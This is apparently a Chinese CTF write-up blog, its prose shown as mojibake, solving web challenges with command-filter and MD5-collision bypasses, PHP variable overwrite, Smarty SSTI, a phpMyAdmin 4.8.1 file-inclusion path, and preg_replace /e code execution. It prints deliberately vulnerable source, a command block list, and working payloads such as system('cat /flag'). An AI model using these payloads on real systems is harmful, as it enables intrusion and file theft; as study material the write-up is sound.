</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&lt;?php
</span></span><span class=line><span class=cl>error_reporting(E_ALL || ~ E_NOTICE);
</span></span><span class=line><span class=cl>header(&#39;content-type:text/html;charset=utf-8&#39;);
</span></span><span class=line><span class=cl>$cmd = $_GET[&#39;cmd&#39;];
</span></span><span class=line><span class=cl>if (!isset($_GET[&#39;img&#39;]) || !isset($_GET[&#39;cmd&#39;])) 
</span></span><span class=line><span class=cl>    header(&#39;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#39;);
</span></span><span class=line><span class=cl>$file = hex2bin(base64_decode(base64_decode($_GET[&#39;img&#39;])));
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>$file = preg_replace(&#34;/[^a-zA-Z0-9.]+/&#34;, &#34;&#34;, $file);
</span></span><span class=line><span class=cl>if (preg_match(&#34;/flag/i&#34;, $file)) {
</span></span><span class=line><span class=cl>    echo &#39;&lt;img src =&#34;./ctf3.jpeg&#34;&gt;&#39;;
</span></span><span class=line><span class=cl>    die(&#34;xixiï½ no flag&#34;);
</span></span><span class=line><span class=cl>} else {
</span></span><span class=line><span class=cl>    $txt = base64_encode(file_get_contents($file));
</span></span><span class=line><span class=cl>    echo &#34;&lt;img src=&#39;data:image/gif;base64,&#34; . $txt . &#34;&#39;&gt;&lt;/img&gt;&#34;;
</span></span><span class=line><span class=cl>    echo &#34;&lt;br&gt;&#34;;
</span></span><span class=line><span class=cl>}
</span></span><span class=line><span class=cl>echo $cmd;
</span></span><span class=line><span class=cl>echo &#34;&lt;br&gt;&#34;;
</span></span><span class=line><span class=cl>if (preg_match(&#34;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#39;|\&#34;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\{|\}|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|{|}|\(|\)|-|&lt;|&gt;/i&#34;, $cmd)) {
</span></span><span class=line><span class=cl>    echo(&#34;forbid ~&#34;);
</span></span><span class=line><span class=cl>    echo &#34;&lt;br&gt;&#34;;
</span></span><span class=line><span class=cl>} else {
</span></span><span class=line><span class=cl>    if ((string)$_POST[&#39;a&#39;] !== (string)$_POST[&#39;b&#39;] &amp;&amp; md5($_POST[&#39;a&#39;]) === md5($_POST[&#39;b&#39;])) {
</span></span><span class=line><span class=cl>        echo `$cmd`;
</span></span><span class=line><span class=cl>    } else {
</span></span><span class=line><span class=cl>        echo (&#34;md5 is funny ~&#34;);
</span></span><span class=line><span class=cl>    }
</span></span><span class=line><span class=cl>}
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>?&gt;
</span></span><span class=line><span class=cl>&lt;html&gt;
</span></span><span class=line><span class=cl>&lt;style&gt;
</span></span><span class=line><span class=cl>  body{
</span></span><span class=line><span class=cl>   background:url(./bj.png)  no-repeat center center;
</span></span><span class=line><span class=cl>   background-size:cover;
</span></span><span class=line><span class=cl>   background-attachment:fixed;
</span></span><span class=line><span class=cl>   background-color:#CCCCCC;
</span></span><span class=line><span class=cl>}
</span></span><span class=line><span class=cl>&lt;/style&gt;
</span></span><span class=line><span class=cl>&lt;body&gt;
</span></span><span class=line><span class=cl>&lt;/body&gt;
</span></span><span class=line><span class=cl>&lt;/html&gt;
</span></span></code></pre></td></tr></table></div></div><p>æˆ‘ä¸çŸ¥é“ä¸ºä»€ä¹ˆï¼Œæˆ‘çš„bpä¸€å®šè¦åœ¨<code>&</code>å‰åŠ ä¸€ä¸ªç©ºæ ¼æ‰å¯ä»¥é€šè¿‡ã€‚</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>?cmd=uniq%20/flag
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>POST
</span></span><span class=line><span class=cl>a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2
</span></span><span class=line><span class=cl>&amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2
</span></span></code></pre></td></tr></table></div></div><p>è¯»æ–‡ä»¶çš„ç»•è¿‡æœ‰</p><blockquote><div class=table-wrapper><table><thead><tr><th style=text-align:center>1</th><th>more:ä¸€é¡µä¸€é¡µçš„æ˜¾ç¤ºæ¡£æ¡ˆå†…å®¹</th></tr></thead><tbody><tr><td style=text-align:center>2</td><td>less:ä¸ more ç±»ä¼¼ï¼Œä½†æ˜¯æ¯” more æ›´å¥½çš„æ˜¯ï¼Œä»–å¯ä»¥[pg dn][pg up]ç¿»é¡µ</td></tr><tr><td style=text-align:center>3</td><td>head:æŸ¥çœ‹å¤´å‡ è¡Œ</td></tr><tr><td style=text-align:center>4</td><td>tac:ä»æœ€åä¸€è¡Œå¼€å§‹æ˜¾ç¤ºï¼Œå¯ä»¥çœ‹å‡º tac æ˜¯ cat çš„åå‘æ˜¾ç¤º</td></tr><tr><td style=text-align:center>5</td><td>tail:æŸ¥çœ‹å°¾å‡ è¡Œ</td></tr><tr><td style=text-align:center>6</td><td>nlï¼šæ˜¾ç¤ºçš„æ—¶å€™ï¼Œé¡ºä¾¿è¾“å‡ºè¡Œå·</td></tr><tr><td style=text-align:center>7</td><td>od:ä»¥äºŒè¿›åˆ¶çš„æ–¹å¼è¯»å–æ¡£æ¡ˆå†…å®¹</td></tr><tr><td style=text-align:center>8</td><td>vi:ä¸€ç§ç¼–è¾‘å™¨ï¼Œè¿™ä¸ªä¹Ÿå¯ä»¥æŸ¥çœ‹</td></tr><tr><td style=text-align:center>9</td><td>vim:ä¸€ç§ç¼–è¾‘å™¨ï¼Œè¿™ä¸ªä¹Ÿå¯ä»¥æŸ¥çœ‹</td></tr><tr><td style=text-align:center>10</td><td>sort:å¯ä»¥æŸ¥çœ‹</td></tr><tr><td style=text-align:center>11</td><td>uniq:å¯ä»¥æŸ¥çœ‹</td></tr><tr><td style=text-align:center>12</td><td>file -f:æŠ¥é”™å‡ºå…·ä½“å†…å®¹</td></tr></tbody></table></div></blockquote><p>æ‘˜è‡ª<a class=link href=https://www.ghtwf01.cn/index.php/archives/273/ target=_blank rel=noopener>å‘½ä»¤æ‰§è¡Œæ¼æ´åˆ©ç”¨åŠç»•è¿‡æ–¹å¼æ€»ç»“</a>ã€‚</p><hr><h1 id=bjdctf2020mark-loves-cat>[BJDCTF2020]Mark loves cat</h1><p>gitæ³„éœ²</p><p>flag.php</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&lt;?php
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>$flag = file_get_contents(&#39;/flag&#39;);
</span></span></code></pre></td></tr></table></div></div><p>index.php</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&lt;?php
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>include &#39;flag.php&#39;;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>$yds = &#34;dog&#34;;
</span></span><span class=line><span class=cl>$is = &#34;cat&#34;;
</span></span><span class=line><span class=cl>$handsome = &#39;yds&#39;;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>foreach($_POST as $x =&gt; $y){
</span></span><span class=line><span class=cl>    $$x = $y;
</span></span><span class=line><span class=cl>}
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>foreach($_GET as $x =&gt; $y){
</span></span><span class=line><span class=cl>    $$x = $$y;
</span></span><span class=line><span class=cl>}
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>foreach($_GET as $x =&gt; $y){
</span></span><span class=line><span class=cl>    if($_GET[&#39;flag&#39;] === $x &amp;&amp; $x !== &#39;flag&#39;){
</span></span><span class=line><span class=cl>        exit($handsome);
</span></span><span class=line><span class=cl>    }
</span></span><span class=line><span class=cl>}
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>if(!isset($_GET[&#39;flag&#39;]) &amp;&amp; !isset($_POST[&#39;flag&#39;])){
</span></span><span class=line><span class=cl>    exit($yds); 
</span></span><span class=line><span class=cl>}
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>if($_POST[&#39;flag&#39;] === &#39;flag&#39;  || $_GET[&#39;flag&#39;] === &#39;flag&#39;){
</span></span><span class=line><span class=cl>    exit($is);
</span></span><span class=line><span class=cl>}
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>echo &#34;the flag is: &#34;.$flag;
</span></span></code></pre></td></tr></table></div></div><p>å°è¯•è¾“å‡º<code>$flag</code>å³å¯ã€‚exit()å‡½æ•°é€€å‡ºæ—¶ä¹Ÿä¼šè¾“å‡ºã€‚</p><p>ç¬¬ä¸€ä¸ªä¸å¯èƒ½å®ç°ï¼Œå¦‚æœPOSTæˆ–GETä¼ å…¥flagçš„è¯å¿…ç„¶å¯¼è‡´<code>$flag</code>ä¿®æ”¹ï¼Œé‚£ä¹ˆæ­£å¥½ç¬¦åˆç¬¬äºŒä¸ªifã€‚</p><p>payload</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>GET
</span></span><span class=line><span class=cl>?yds=flag
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>POST(ä»»æ„ï¼Œä½†æ˜¯éœ€è¦ä¿è¯ä¸ä¼ flag)
</span></span><span class=line><span class=cl>is=233flag
</span></span></code></pre></td></tr></table></div></div><hr><h1 id=bjdctf2020the-mystery-of-ip>[BJDCTF2020]The mystery of ip</h1><p>hint.phpé‡Œé¢æœ‰æ³¨é‡Š</p><blockquote><p>Do you know why i know your ip?</p></blockquote><p>å»flag.phpå°è¯•åŠ å…¥è¯·æ±‚å¤´x-forward-xã€client-ipå‘ç°ipå¯ä»¥æ”¹å˜ã€‚ç„¶åæ˜¯è‡ªå·±æ„Ÿè§‰ç½‘é¡µå¾ˆç®€å•ï¼Œçªç ´ç‚¹åœ¨è¯·æ±‚å¤´ä¸­ï¼Œå°è¯•äº†ä¸‹sstiæ¨¡æ¿æ³¨å…¥ï¼Œå‘ç°æˆåŠŸäº†ã€‚</p><p>å°è¯•äº†å‡ ä¸ªsstiçš„payloadä¸è¡Œï¼Œä½†æ˜¯æç¤ºäº†</p><blockquote><p>Uncaught &ndash;> Smarty Compiler:&mldr;&mldr;&mldr;&mldr;&mldr;&mldr;&mldr;</p></blockquote><p>å¾—çŸ¥äº†è¿™ä¸ªæ˜¯Smartyå¼•æ“ï¼Œåœ¨ç½‘ä¸Šå°è¯•æœç´¢è¿™ç§ç±»å‹çš„æ³¨å…¥</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>è¯·æ±‚ï¼š
</span></span><span class=line><span class=cl>X-Forwarded-For: {system(&#39;cat /flag&#39;)}
</span></span></code></pre></td></tr></table></div></div><p><a class=link href=https://github.com/epinna/tplmap target=_blank rel=noopener>SSTIç¥å™¨â€“Tplmap</a>ï¼Œçœ‹ä»‹ç»æ˜¯å’Œsqlmapå·®ä¸å¤šçš„å·¥å…·ã€‚</p><p>è¿™ä¸ªå¸ˆå‚…çš„åšå®¢å†™çš„å¾ˆå…¨ï¼šhttps://www.cnblogs.com/R3col/p/12746485.htmlï¼Œæ‰€æœ‰ç±»å‹çš„æ¨¡æ¿å¼•æ“payloadéƒ½æœ‰ï¼Œæ³¨å…¥ä¹‹å‰éœ€è¦å…ˆç¡®å®šç±»å‹ã€‚</p><p><a class=link href=https://www.cnblogs.com/20175211lyz/p/11425368.html target=_blank rel=noopener>CTF SSTI(æœåŠ¡å™¨æ¨¡æ¿æ³¨å…¥)</a></p><p><a class=link href=https://xz.aliyun.com/t/3679/ target=_blank rel=noopener>flaskä¹‹sstiæ¨¡ç‰ˆæ³¨å…¥ä»é›¶åˆ°å…¥é—¨</a></p><hr><h1 id=gwctf-2019æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“>[GWCTF 2019]æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“</h1><p>é¡µé¢æ˜¯ä¹±ç ï¼Œæƒ³çŸ¥é“å†…å®¹äº†å¯ä»¥çœ‹ä¸‹å›¾</p><p>$$å„ç§ä¹±ç å›¾</p><p>å¯¹ç…§çš„æ˜¯å¤æ–‡ç ã€‚æ˜¯ä»¥GBKæ–¹å¼è¯»å–UTF-8ç¼–ç çš„ä¸­æ–‡ï¼Œæˆ‘ä¸¾ä¸ªä¾‹å­ï¼Œä½¿ç”¨vscodeï¼Œå…ˆé€šè¿‡ç¼–ç ä¿å­˜&ndash;>GBKï¼Œå†é€šè¿‡ç¼–ç æ‰“å¼€&ndash;>UTF-8ã€‚å†…å®¹å¦‚ä¸‹</p><blockquote><p>æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“ï¼Œä½†é‡Œé¢ä»€ä¹ˆä¹Ÿæ²¡æœ‰~
ä¸ä¿¡ä½ æ‰¾</p></blockquote><p>æç¤ºæ˜¯æ•°æ®åº“äº†ï¼Œé‚£ä¹ˆæœæ–­å°è¯•PHPmyadminï¼Œè®¿é—®æˆåŠŸï¼Œç„¶åæŸ¥çœ‹ä¸‹ç‰ˆæœ¬ï¼Œå»ç½‘ä¸Šæœç´¢å¯¹åº”ç‰ˆæœ¬çš„æ¼æ´</p><p><a class=link href=https://www.secpulse.com/archives/72817.html target=_blank rel=noopener>phpmyadmin4.8.1åå°getshell</a></p><p>payload</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>/phpmyadmin/index.php?target=db_sql.php%253f../../../../../../flag
</span></span></code></pre></td></tr></table></div></div><p>å¯ä»¥åŒ…å«ä»»æ„æ–‡ä»¶ï¼Œç†åº”å¯ä»¥åŒ…å«æ•°æ®åº“æ–‡ä»¶ï¼Œåœ¨æ•°æ®åº“è¡¨å­—æ®µå†™shellï¼Œæ²¡æˆä¸çŸ¥é“æ•°æ®åº“æ–‡ä»¶åç§°</p><hr><h1 id=20210301>2021.03.01</h1><hr><h1 id=bjdctf2020zjctfä¸è¿‡å¦‚æ­¤>[BJDCTF2020]ZJCTFï¼Œä¸è¿‡å¦‚æ­¤</h1><p>ç»•è¿‡</p><p>ç¬¬ä¸€å±‚ç”¨phpä¼ªåè®®ä¸­çš„dataå°è£…æµã€‚<a class=link href=https://segmentfault.com/a/1190000018991087 target=_blank rel=noopener>PHPä¼ªåè®®æ€»ç»“</a></p><p>ç„¶åè¿›å…¥æ–‡ä»¶åŒ…å«ï¼Œæç¤ºåŒ…å«next.phpæ–‡ä»¶ï¼Œè¿˜æ˜¯ä½¿ç”¨phpä¼ªåè®®ä¸­çš„php://filter</p><p>payload</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>?text=data://text/plain,I have a dream&amp;file=php://filter/convert.base64-encode/resource=next.php
</span></span></code></pre></td></tr></table></div></div><p>è¯»å‡ºæ¥çš„next.php</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>PD9waHAKJGlkID0gJF9HRVRbJ2lkJ107CiRfU0VTU0lPTlsnaWQnXSA9ICRpZDsKCmZ1bmN0aW9uIGNvbXBsZXgoJHJlLCAkc3RyKSB7CiAgICByZXR1cm4gcHJlZ19yZXBsYWNlKAogICAgICAgICcvKCcgLiAkcmUgLiAnKS9laScsCiAgICAgICAgJ3N0cnRvbG93ZXIoIlxcMSIpJywKICAgICAgICAkc3RyCiAgICApOwp9CgoKZm9yZWFjaCgkX0dFVCBhcyAkcmUgPT4gJHN0cikgewogICAgZWNobyBjb21wbGV4KCRyZSwgJHN0cikuICJcbiI7Cn0KCmZ1bmN0aW9uIGdldEZsYWcoKXsKCUBldmFsKCRfR0VUWydjbWQnXSk7Cn0K
</span></span></code></pre></td></tr></table></div></div><p>base64è§£ç ï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&lt;?php
</span></span><span class=line><span class=cl>$id = $_GET[&#39;id&#39;];
</span></span><span class=line><span class=cl>$_SESSION[&#39;id&#39;] = $id;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>function complex($re, $str) {
</span></span><span class=line><span class=cl>    return preg_replace(
</span></span><span class=line><span class=cl>        &#39;/(&#39; . $re . &#39;)/ei&#39;,
</span></span><span class=line><span class=cl>        &#39;strtolower(&#34;\\1&#34;)&#39;,
</span></span><span class=line><span class=cl>        $str
</span></span><span class=line><span class=cl>    );
</span></span><span class=line><span class=cl>}
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>foreach($_GET as $re =&gt; $str) {
</span></span><span class=line><span class=cl>    echo complex($re, $str). &#34;\n&#34;;
</span></span><span class=line><span class=cl>}
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>function getFlag(){
</span></span><span class=line><span class=cl>	@eval($_GET[&#39;cmd&#39;]);
</span></span><span class=line><span class=cl>}
</span></span></code></pre></td></tr></table></div></div><p>è¿™é‡Œæƒ³è¦é€šè¿‡éœ€è¦çŸ¥é“ä¸€ä¸ª<a class=link href=http://www.xinyueseo.com/websecurity/158.html target=_blank rel=noopener>æ·±å…¥ç ”ç©¶ preg_replace /e æ¨¡å¼ä¸‹çš„ä»£ç æ¼æ´é—®é¢˜</a></p><p>æœ€ç»ˆpayload</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>next.php?\S*=${getFlag()}&amp;cmd=system(&#39;cat /flag&#39;);
</span></span></code></pre></td></tr></table></div></div><hr><h1 id=de1ctf-2019ssrf-me>[De1CTF 2019]SSRF Me</h1><p>è¿›å…¥é¡µé¢æ˜¯ä¸€å †æºç ï¼Œä¹‹å‰å†™è¿‡flaskçš„å¯ä»¥å¤§æ¦‚ç†å‡ºæ¥å‡ ä¸ªé‡è¦çš„ç‚¹ï¼Œä½†æ˜¯è¿˜æ˜¯è´´ä¸€ä¸‹æºç </p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#! /usr/bin/env python</span>
</span></span><span class=line><span class=cl><span class=c1># encoding=utf-8</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>flask</span> <span class=kn>import</span> <span class=n>Flask</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>flask</span> <span class=kn>import</span> <span class=n>request</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>socket</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>hashlib</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>urllib</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>sys</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>json</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>reload</span><span class=p>(</span><span class=n>sys</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sys</span><span class=o>.</span><span class=n>setdefaultencoding</span><span class=p>(</span><span class=s1>&#39;latin1&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>app</span> <span class=o>=</span> <span class=n>Flask</span><span class=p>(</span><span class=vm>__name__</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>secert_key</span> <span class=o>=</span> <span class=n>os</span><span class=o>.</span><span class=n>urandom</span><span class=p>(</span><span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Task</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=fm>__init__</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>action</span><span class=p>,</span> <span class=n>param</span><span class=p>,</span> <span class=n>sign</span><span class=p>,</span> <span class=n>ip</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>action</span> <span class=o>=</span> <span class=n>action</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>param</span> <span class=o>=</span> <span class=n>param</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>sign</span> <span class=o>=</span> <span class=n>sign</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>sandbox</span> <span class=o>=</span> <span class=n>md5</span><span class=p>(</span><span class=n>ip</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=ow>not</span> <span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>exists</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>sandbox</span><span class=p>)):</span>  <span class=c1># SandBox For Remote_Addr</span>
</span></span><span class=line><span class=cl>            <span class=n>os</span><span class=o>.</span><span class=n>mkdir</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>sandbox</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>Exec</span><span class=p>(</span><span class=bp>self</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>result</span> <span class=o>=</span> <span class=p>{}</span>
</span></span><span class=line><span class=cl>        <span class=n>result</span><span class=p>[</span><span class=s1>&#39;code&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=mi>500</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>checkSign</span><span class=p>()):</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=s2>&#34;scan&#34;</span> <span class=ow>in</span> <span class=bp>self</span><span class=o>.</span><span class=n>action</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>tmpfile</span> <span class=o>=</span> <span class=nb>open</span><span class=p>(</span><span class=s2>&#34;./</span><span class=si>%s</span><span class=s2>/result.txt&#34;</span> <span class=o>%</span> <span class=bp>self</span><span class=o>.</span><span class=n>sandbox</span><span class=p>,</span> <span class=s1>&#39;w&#39;</span><span class=p>)</span>
